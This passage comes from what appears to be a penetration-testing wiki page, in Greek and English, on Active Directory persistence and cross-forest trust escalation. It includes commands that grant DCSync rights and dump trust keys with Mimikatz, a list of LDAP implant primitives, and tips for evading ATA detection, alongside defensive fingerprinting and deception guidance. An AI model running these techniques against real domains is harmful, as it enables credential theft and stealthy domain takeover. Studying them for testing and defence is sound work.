- Να δώσεις [**DCSync**](#dcsync) privileges σε έναν user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Το **Silver Ticket attack** δημιουργεί ένα **legitimate Ticket Granting Service (TGS) ticket** για μια συγκεκριμένη service χρησιμοποιώντας το **NTLM hash** (για παράδειγμα, το **hash of the PC account**). Αυτή η μέθοδος χρησιμοποιείται για να **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Ένα **Golden Ticket attack** περιλαμβάνει έναν attacker που αποκτά πρόσβαση στο **NTLM hash of the krbtgt account** σε ένα Active Directory (AD) environment. Αυτός ο λογαριασμός είναι ειδικός επειδή χρησιμοποιείται για να υπογράφει όλα τα **Ticket Granting Tickets (TGTs)**, τα οποία είναι απαραίτητα για την αυθεντικοποίηση μέσα στο AD network.

Μόλις ο attacker αποκτήσει αυτό το hash, μπορεί να δημιουργήσει **TGTs** για οποιονδήποτε λογαριασμό επιλέξει (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Αυτά είναι σαν golden tickets forged με τρόπο που **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

Το **Having certificates of an account or being able to request them** είναι ένας πολύ καλός τρόπος για να μπορείς να persist στον users account (ακόμα κι αν αλλάξει το password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Το αντικείμενο **AdminSDHolder** στο Active Directory διασφαλίζει την ασφάλεια των **privileged groups** (όπως Domain Admins και Enterprise Admins) εφαρμόζοντας ένα standard **Access Control List (ACL)** σε αυτά τα groups για να αποτρέψει μη εξουσιοδοτημένες αλλαγές. Ωστόσο, αυτή η δυνατότητα μπορεί να γίνει abuse· αν ένας attacker τροποποιήσει το ACL του AdminSDHolder ώστε να δώσει πλήρη πρόσβαση σε έναν κανονικό user, τότε αυτός ο user αποκτά εκτεταμένο έλεγχο πάνω σε όλα τα privileged groups. Αυτό το security measure, που προορίζεται για προστασία, μπορεί έτσι να γυρίσει μπούμερανγκ, επιτρέποντας αδικαιολόγητη πρόσβαση αν δεν παρακολουθείται στενά.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Μέσα σε κάθε **Domain Controller (DC)** υπάρχει ένας λογαριασμός **local administrator**. Αποκτώντας admin rights σε ένα τέτοιο machine, το local Administrator hash μπορεί να εξαχθεί χρησιμοποιώντας **mimikatz**. Στη συνέχεια απαιτείται μια τροποποίηση στο registry για να **enable the use of this password**, επιτρέποντας απομακρυσμένη πρόσβαση στον local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Θα μπορούσες να **give** κάποια **special permissions** σε έναν **user** πάνω σε συγκεκριμένα domain objects, κάτι που θα επιτρέψει στον user να **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Τα **security descriptors** χρησιμοποιούνται για να **store** τα **permissions** που έχει ένα **object** **over** ένα **object**. Αν μπορείς απλώς να **make** μια **little change** στο **security descriptor** ενός object, μπορείς να αποκτήσεις πολύ ενδιαφέροντα privileges πάνω σε αυτό το object χωρίς να χρειάζεται να είσαι μέλος ενός privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse την `dynamicObject` auxiliary class για να δημιουργήσεις short-lived principals/GPOs/DNS records με `entryTTL`/`msDS-Entry-Time-To-Die`; αυτοδιαγράφονται χωρίς tombstones, σβήνοντας LDAP evidence ενώ αφήνουν orphan SIDs, broken `gPLink` references, ή cached DNS responses (π.χ. AdminSDHolder ACE pollution ή malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Τροποποίησε το **LSASS** στη memory για να δημιουργήσεις ένα **universal password**, δίνοντας πρόσβαση σε όλους τους domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Μάθε τι είναι ένα SSP (Security Support Provider) εδώ.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Μπορείς να δημιουργήσεις το **δικό σου SSP** για να **capture** σε **clear text** τα **credentials** που χρησιμοποιούνται για πρόσβαση στο machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Καταγράφει ένα **new Domain Controller** στο AD και το χρησιμοποιεί για να **push attributes** (SIDHistory, SPNs...) σε καθορισμένα objects **without** να αφήνει κανένα **logs** σχετικά με τις **modifications**. Χρειάζεσαι δικαιώματα **DA** και να βρίσκεσαι μέσα στο **root domain**.\
Σημείωσε ότι αν χρησιμοποιήσεις λάθος data, θα εμφανιστούν πολύ άσχημα logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Προηγουμένως συζητήσαμε πώς να escalate privileges αν έχεις **enough permission to read LAPS passwords**. Ωστόσο, αυτοί οι κωδικοί μπορούν επίσης να χρησιμοποιηθούν για να **maintain persistence**.\
Δες:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Η Microsoft θεωρεί το **Forest** ως το security boundary. Αυτό σημαίνει ότι το **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

Ένα [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) είναι ένας μηχανισμός ασφαλείας που επιτρέπει σε έναν user από ένα **domain** να access resources σε ένα άλλο **domain**. Ουσιαστικά δημιουργεί μια σύνδεση μεταξύ των authentication systems των δύο domains, επιτρέποντας στις authentication verifications να ρέουν ομαλά. Όταν τα domains στήνουν ένα trust, ανταλλάσσουν και διατηρούν συγκεκριμένα **keys** μέσα στους **Domain Controllers (DCs)** τους, τα οποία είναι κρίσιμα για την ακεραιότητα του trust.

Σε ένα τυπικό σενάριο, αν ένας user θέλει να access μια service σε ένα **trusted domain**, πρέπει πρώτα να ζητήσει ένα ειδικό ticket γνωστό ως **inter-realm TGT** από τον DC του δικού του domain. Αυτό το TGT είναι κρυπτογραφημένο με ένα κοινό **key** που έχουν συμφωνήσει και τα δύο domains. Στη συνέχεια ο user παρουσιάζει αυτό το TGT στον **DC of the trusted domain** για να πάρει ένα service ticket (**TGS**). Μετά την επιτυχή validation του inter-realm TGT από τον DC του trusted domain, εκδίδεται ένα TGS, δίνοντας στον user πρόσβαση στη service.

**Steps**:

1. Ένας **client computer** στο **Domain 1** ξεκινά τη διαδικασία χρησιμοποιώντας το **NTLM hash** του για να ζητήσει ένα **Ticket Granting Ticket (TGT)** από τον **Domain Controller (DC1)** του.
2. Ο DC1 εκδίδει νέο TGT αν ο client authenticated successfully.
3. Ο client στη συνέχεια ζητά ένα **inter-realm TGT** από τον DC1, το οποίο χρειάζεται για να access resources στο **Domain 2**.
4. Το inter-realm TGT είναι encrypted με ένα **trust key** που μοιράζονται οι DC1 και DC2 στο πλαίσιο του two-way domain trust.
5. Ο client παίρνει το inter-realm TGT στον **Domain 2's Domain Controller (DC2)**.
6. Ο DC2 verifies το inter-realm TGT χρησιμοποιώντας το shared trust key του και, αν είναι valid, εκδίδει ένα **Ticket Granting Service (TGS)** για τον server στο Domain 2 που θέλει να access ο client.
7. Τέλος, ο client παρουσιάζει αυτό το TGS στον server, το οποίο είναι encrypted με το server’s account hash, για να πάρει πρόσβαση στη service στο Domain 2.

### Different trusts

Είναι σημαντικό να σημειωθεί ότι **a trust can be 1 way or 2 ways**. Στις 2 ways επιλογές, και τα δύο domains θα trust το ένα το άλλο, αλλά στη **1 way** trust relation το ένα από τα domains θα είναι το **trusted** και το άλλο το **trusting** domain. Στην τελευταία περίπτωση, **you will only be able to access resources inside the trusting domain from the trusted one**.

Αν το Domain A trusts το Domain B, το A είναι το trusting domain και το B το trusted one. Επιπλέον, στο **Domain A**, αυτό θα είναι ένα **Outbound trust**; και στο **Domain B**, αυτό θα είναι ένα **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Αυτό είναι ένα συνηθισμένο setup μέσα στο ίδιο forest, όπου ένα child domain έχει αυτόματα ένα two-way transitive trust με το parent domain του. Ουσιαστικά, αυτό σημαίνει ότι τα authentication requests μπορούν να ρέουν ομαλά μεταξύ του parent και του child.
- **Cross-link Trusts**: Αναφέρονται ως "shortcut trusts," και δημιουργούνται μεταξύ child domains για να επιταχύνουν τα referral processes. Σε σύνθετα forests, τα authentication referrals συνήθως πρέπει να ταξιδεύουν μέχρι το forest root και μετά προς τα κάτω στο target domain. Δημιουργώντας cross-links, το ταξίδι μικραίνει, κάτι που είναι ιδιαίτερα χρήσιμο σε γεωγραφικά διασκορπισμένα περιβάλλοντα.
- **External Trusts**: Στήνονται μεταξύ διαφορετικών, άσχετων domains και είναι non-transitive by nature. Σύμφωνα με την [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), τα external trusts είναι χρήσιμα για access resources σε ένα domain έξω από το current forest που δεν συνδέεται με forest trust. Η ασφάλεια ενισχύεται μέσω SID filtering με external trusts.
- **Tree-root Trusts**: Αυτά τα trusts δημιουργούνται αυτόματα μεταξύ του forest root domain και ενός newly added tree root. Αν και δεν συναντώνται συχνά, τα tree-root trusts είναι σημαντικά για την προσθήκη νέων domain trees σε ένα forest, επιτρέποντάς τους να διατηρούν ένα μοναδικό domain name και διασφαλίζοντας two-way transitivity. Περισσότερες πληροφορίες υπάρχουν στον [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Αυτός ο τύπος trust είναι ένα two-way transitive trust μεταξύ δύο forest root domains, με επιπλέον επιβολή SID filtering για ενίσχυση των security measures.
- **MIT Trusts**: Αυτά τα trusts στήνονται με non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. Τα MIT trusts είναι λίγο πιο εξειδικευμένα και απευθύνονται σε environments που απαιτούν integration με Kerberos-based systems έξω από το Windows ecosystem.

#### Other differences in **trusting relationships**

- A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.
- A trust relationship can be set up as **bidirectional trust** (both trust each other) or as **one-way trust** (only one of them trust the other).

### Attack Path

1. **Enumerate** τις trusting relationships
2. Έλεγξε αν κάποιο **security principal** (user/group/computer) έχει **access** σε resources του **other domain**, ίσως μέσω ACE entries ή επειδή είναι σε groups του άλλου domain. Ψάξε για **relationships across domains** (το trust δημιουργήθηκε πιθανότατα για αυτό).
1. kerberoast σε αυτή την περίπτωση θα μπορούσε να είναι άλλη μια επιλογή.
3. **Compromise** τους **accounts** που μπορούν να **pivot** through domains.

Attackers with could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

Μπορείς να ελέγξεις **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** για να βρεις foreign security principals στο domain. Αυτοί θα είναι user/group από **an external domain/forest**.

Μπορείς να το ελέγξεις αυτό στο **Bloodhound** ή χρησιμοποιώντας powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Κλιμάκωση δικαιωμάτων από Child σε Parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Άλλοι τρόποι για να enumerate domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Υπάρχουν **2 trusted keys**, ένα για _Child --> Parent_ και ένα άλλο για _Parent_ --> _Child_.\
> Μπορείς να χρησιμοποιήσεις το ένα που χρησιμοποιείται από το τρέχον domain με:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin to the child/parent domain abusing the trust with SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Η κατανόηση του τρόπου με τον οποίο μπορεί να εκμεταλλευτεί το Configuration Naming Context (NC) είναι κρίσιμη. Το Configuration NC λειτουργεί ως κεντρικό αποθετήριο για δεδομένα διαμόρφωσης σε όλο το forest σε περιβάλλοντα Active Directory (AD). Αυτά τα δεδομένα αναπαράγονται σε κάθε Domain Controller (DC) μέσα στο forest, με τους writable DCs να διατηρούν ένα writable αντίγραφο του Configuration NC. Για να το εκμεταλλευτεί κανείς αυτό, πρέπει να έχει **SYSTEM privileges on a DC**, κατά προτίμηση σε child DC.

**Link GPO to root DC site**

Ο φάκελος Sites του Configuration NC περιλαμβάνει πληροφορίες για τα sites όλων των computers που είναι joined στο domain μέσα στο AD forest. Λειτουργώντας με SYSTEM privileges σε οποιοδήποτε DC, οι attackers μπορούν να συνδέσουν GPOs με τα root DC sites. Αυτή η ενέργεια μπορεί να compromize το root domain μέσω χειραγώγησης των policies που εφαρμόζονται σε αυτά τα sites.

Για αναλυτικές πληροφορίες, μπορεί κανείς να εξερευνήσει έρευνα σχετικά με το [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Ένα attack vector περιλαμβάνει στοχοποίηση privileged gMSAs μέσα στο domain. Το KDS Root key, απαραίτητο για τον υπολογισμό των passwords των gMSAs, αποθηκεύεται μέσα στο Configuration NC. Με SYSTEM privileges σε οποιοδήποτε DC, είναι δυνατό να γίνει πρόσβαση στο KDS Root key και να υπολογιστούν τα passwords για οποιοδήποτε gMSA σε όλο το forest.

Λεπτομερής ανάλυση και βήμα-βήμα καθοδήγηση μπορεί να βρεθεί στο:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Συμπληρωματική delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Πρόσθετη εξωτερική έρευνα: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Αυτή η μέθοδος απαιτεί υπομονή, περιμένοντας τη δημιουργία νέων privileged AD objects. Με SYSTEM privileges, ένας attacker μπορεί να τροποποιήσει το AD Schema ώστε να δώσει σε οποιονδήποτε user πλήρη έλεγχο σε όλες τις classes. Αυτό μπορεί να οδηγήσει σε unauthorized access και control πάνω σε newly created AD objects.

Περαιτέρω ανάγνωση είναι διαθέσιμη στο [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Η ευπάθεια ADCS ESC5 στοχεύει τον έλεγχο των Public Key Infrastructure (PKI) objects για τη δημιουργία ενός certificate template που επιτρέπει authentication ως οποιοσδήποτε user μέσα στο forest. Εφόσον τα PKI objects βρίσκονται στο Configuration NC, η compromise ενός writable child DC επιτρέπει την εκτέλεση ESC5 attacks.

Περισσότερες λεπτομέρειες μπορούν να διαβαστούν στο [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Σε σενάρια χωρίς ADCS, ο attacker έχει τη δυνατότητα να στήσει τα απαραίτητα components, όπως συζητείται στο [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Σε αυτό το σενάριο **το domain σου είναι trusted** από ένα εξωτερικό, δίνοντάς σου **απροσδιόριστα permissions** πάνω σε αυτό. Θα χρειαστεί να βρεις **ποιοι principals του domain σου έχουν ποια πρόσβαση πάνω στο εξωτερικό domain** και στη συνέχεια να προσπαθήσεις να το εκμεταλλευτείς:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Σε αυτό το σενάριο **ο τομέας σου** **εμπιστεύεται** κάποια **δικαιώματα** σε principal από **διαφορετικούς τομείς**.

Ωστόσο, όταν ένας **τομέας εμπιστεύεται** από τον trusting domain, το trusted domain **δημιουργεί έναν χρήστη** με **προβλέψιμο όνομα** που χρησιμοποιεί ως **password το trusted password**. Αυτό σημαίνει ότι είναι δυνατό να **αποκτήσεις πρόσβαση σε έναν χρήστη από τον trusting domain για να μπεις στον trusted** και να τον enumerate και να προσπαθήσεις να κλιμακώσεις περισσότερα privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ένας άλλος τρόπος να compromise το trusted domain είναι να βρεις ένα [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) που δημιουργήθηκε στην **αντίθετη κατεύθυνση** του domain trust (κάτι που δεν είναι πολύ συνηθισμένο).

Ένας άλλος τρόπος να compromise το trusted domain είναι να περιμένεις σε ένα machine όπου ένας **user από το trusted domain μπορεί να κάνει access** και να συνδεθεί μέσω **RDP**. Τότε, ο attacker θα μπορούσε να inject code στο process της RDP session και να **access the origin domain of the victim** από εκεί.\
Επιπλέον, αν το **victim mounted his hard drive**, από το **RDP session** process ο attacker θα μπορούσε να αποθηκεύσει **backdoors** στον **startup folder του hard drive**. Αυτή η τεχνική ονομάζεται **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Ο κίνδυνος επιθέσεων που αξιοποιούν το SID history attribute across forest trusts μετριάζεται από το SID Filtering, το οποίο ενεργοποιείται by default σε όλα τα inter-forest trusts. Αυτό βασίζεται στην υπόθεση ότι τα intra-forest trusts είναι secure, θεωρώντας το forest, και όχι το domain, ως το security boundary σύμφωνα με τη θέση της Microsoft.
- Ωστόσο, υπάρχει μια λεπτομέρεια: το SID filtering μπορεί να διαταράξει applications και user access, οδηγώντας στην περιστασιακή απενεργοποίησή του.

### **Selective Authentication:**

- Για inter-forest trusts, η χρήση του Selective Authentication διασφαλίζει ότι οι users από τα δύο forests δεν authenticated αυτόματα. Αντίθετα, απαιτούνται explicit permissions ώστε οι users να μπορούν να access domains και servers μέσα στο trusting domain ή forest.
- Είναι σημαντικό να σημειωθεί ότι αυτά τα μέτρα δεν προστατεύουν από την exploitation του writable Configuration Naming Context (NC) ή από επιθέσεις στο trust account.

[**Περισσότερες πληροφορίες για domain trusts στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

Η [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) επανυλοποιεί bloodyAD-style LDAP primitives ως x64 Beacon Object Files που εκτελούνται εξ ολοκλήρου μέσα σε ένα on-host implant (π.χ., Adaptix C2). Οι operators κάνουν compile το pack με `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, φορτώνουν το `ldap.axs`, και μετά καλούν `ldap <subcommand>` από το beacon. Όλη η traffic περνάει μέσα από το current logon security context μέσω LDAP (389) με signing/sealing ή LDAPS (636) με auto certificate trust, άρα δεν απαιτούνται socks proxies ή disk artifacts.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, και `get-groupmembers` επιλύουν short names/OU paths σε πλήρη DNs και κάνουν dump τα αντίστοιχα objects.
- `get-object`, `get-attribute`, και `get-domaininfo` αντλούν arbitrary attributes (συμπεριλαμβανομένων security descriptors) καθώς και τα forest/domain metadata από το `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, και `get-rbcd` αποκαλύπτουν roasting candidates, delegation settings, και υπάρχοντες descriptors [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) απευθείας από το LDAP.
- `get-acl` και `get-writable --detailed` αναλύουν το DACL για να παραθέσουν trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), και inheritance, δίνοντας άμεσα targets για ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives για escalation & persistence

- Τα Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) επιτρέπουν στον operator να στήσει νέα principals ή machine accounts όπου υπάρχουν OU rights. Οι `add-groupmember`, `set-password`, `add-attribute`, και `set-attribute` hijackάρουν απευθείας στόχους μόλις βρεθούν write-property rights.
- Commands με έμφαση στα ACL, όπως τα `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, και `add-dcsync`, μετατρέπουν τα WriteDACL/WriteOwner σε οποιοδήποτε AD object σε password resets, έλεγχο group membership, ή DCSync replication privileges χωρίς να αφήνουν PowerShell/ADSI artifacts. Τα `remove-*` αντίστοιχα καθαρίζουν τα injected ACEs.

### Delegation, roasting, και Kerberos abuse

- Τα `add-spn`/`set-spn` κάνουν αμέσως έναν compromised user Kerberoastable· το `add-asreproastable` (UAC toggle) τον σηματοδοτεί για AS-REP roasting χωρίς να πειράζει το password.
- Τα Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) ξαναγράφουν τα `msDS-AllowedToDelegateTo`, UAC flags, ή `msDS-AllowedToActOnBehalfOfOtherIdentity` από το beacon, ενεργοποιώντας constrained/unconstrained/RBCD attack paths και eliminatώντας την ανάγκη για remote PowerShell ή RSAT.

### sidHistory injection, OU relocation, και attack surface shaping

- Το `add-sidhistory` injectάρει privileged SIDs στο SID history ενός controlled principal (δες [SID-History Injection](sid-history-injection.md)), παρέχοντας stealthy access inheritance πλήρως over LDAP/LDAPS.
- Το `move-object` αλλάζει το DN/OU computers ή users, επιτρέποντας σε έναν attacker να σύρει assets σε OUs όπου delegated rights ήδη υπάρχουν πριν κάνει abuse τα `set-password`, `add-groupmember`, ή `add-spn`.
- Commands αφαίρεσης με στενό scope (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, κ.λπ.) επιτρέπουν γρήγορο rollback αφού ο operator harvestάρει credentials ή persistence, ελαχιστοποιώντας το telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Μάθε περισσότερα για το πώς να προστατεύεις credentials εδώ.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Συνιστάται οι Domain Admins να επιτρέπεται να κάνουν login μόνο σε Domain Controllers, αποφεύγοντας τη χρήση τους σε άλλους hosts.
- **Service Account Privileges**: Τα Services δεν πρέπει να εκτελούνται με Domain Admin (DA) privileges για τη διατήρηση της ασφάλειας.
- **Temporal Privilege Limitation**: Για tasks που απαιτούν DA privileges, η διάρκεια τους πρέπει να περιορίζεται. Αυτό μπορεί να επιτευχθεί με: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Κάνε audit στα Event IDs 2889/3074/3075 και μετά εφάρμοσε LDAP signing plus LDAPS channel binding σε DCs/clients για να μπλοκάρεις LDAP MITM/relay attempts.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

Αν θέλεις να εντοπίζεις common AD tradecraft, **μην βασίζεσαι μόνο σε operator-controlled artifacts** όπως renamed binaries, service names, temp batch files, ή output paths. Κάνε baseline το πώς οι legitimate Windows clients χτίζουν [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, και WMI traffic, και μετά ψάξε για **implementation quirks** που παραμένουν ακόμα και αφού ο operator επεξεργαστεί τα `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, ή `ntlmrelayx.py`.

- **High-confidence standalone candidates** (after validating against your own baseline):
- Authenticated DCE/RPC using `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding filled with `0xff`
- LDAP Kerberos binds that place a raw Kerberos `AP-REQ` directly in SPNEGO `mechToken`
- SMB2/3 negotiate requests with ASCII-looking `ClientGuid` values
- WMI `IWbemLevel1Login::NTLMLogin` using the non-standard namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Better as correlation/scoring features**:
- Sparse or duplicated Kerberos etype lists, unusual/missing `PA-DATA`, or TGS-REQ etype ordering that differs from native Windows
- NTLM Type 1 messages missing version info or Type 3 messages with null host names
- Raw NTLMSSP carried in DCE/RPC instead of SPNEGO, missing DCE/RPC verification trailers, or SPNEGO/Kerberos OID mismatches
- Several of these traits from the same host/user/session/time window are far stronger than any single weak field
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, and tool-specific HTTP/WebDAV/RDP/MSSQL strings
- These are easy for operators to change and are best used to explain why a cross-protocol cluster is suspicious
- **Operational notes**:
- Some of these signals require decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, or service-side visibility
- Validate against Samba/Linux clients, appliances, and legacy software before promoting to alerts
- Promote detections from enrichment -> hunting -> alerting as you build confidence in the baseline

### **Implementing Deception Techniques**

- Η υλοποίηση deception περιλαμβάνει setting traps, όπως decoy users ή computers, με features όπως passwords που δεν λήγουν ή που είναι marked as Trusted for Delegation. Μια λεπτομερής προσέγγιση περιλαμβάνει τη δημιουργία users με συγκεκριμένα rights ή την προσθήκη τους σε high privilege groups.
- Ένα πρακτικό παράδειγμα περιλαμβάνει τη χρήση εργαλείων όπως: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Περισσότερα για την ανάπτυξη deception techniques μπορείς να βρεις στο [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Suspicious indicators περιλαμβάνουν atypical ObjectSID, infrequent logons, creation dates, και low bad password counts.
- **General Indicators**: Η σύγκριση attributes πιθανών decoy objects με εκείνα γνήσιων μπορεί να αποκαλύψει ασυνέπειες. Εργαλεία όπως το [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) μπορούν να βοηθήσουν στον εντοπισμό τέτοιων decepetions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Αποφυγή session enumeration σε Domain Controllers για να αποφευχθεί το ATA detection.
- **Ticket Impersonation**: Η αξιοποίηση **aes** keys για ticket creation βοηθά να αποφευχθεί η ανίχνευση, επειδή δεν γίνεται downgrade σε NTLM.
- **DCSync Attacks**: Συνιστάται η εκτέλεση από μη-Domain Controller για αποφυγή ATA detection, καθώς η άμεση εκτέλεση από Domain Controller θα ενεργοποιήσει alerts.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
